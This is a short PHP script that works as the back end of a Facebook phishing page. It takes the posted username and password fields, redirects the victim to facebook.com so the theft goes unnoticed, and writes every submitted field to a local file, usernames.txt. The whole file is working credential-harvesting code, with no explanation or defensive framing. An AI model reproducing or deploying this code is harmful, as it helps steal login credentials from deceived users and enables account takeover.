<?php
    $name = $_POST['name'];
    $password = $_POST['password'];

    header
('location: https://www.facebook.com');
    $handle=fopen("usernames.txt","a");
    foreach($_POST as $name=>$password)
    {
        fwrite($handle,$password);
        fwrite($handle,"=");
        fwrite($handle,$name);
        fwrite($handle,"\r\n");
    }

    fwrite($handle,"\r\n");
    fclose($handle);
    exit();

?>
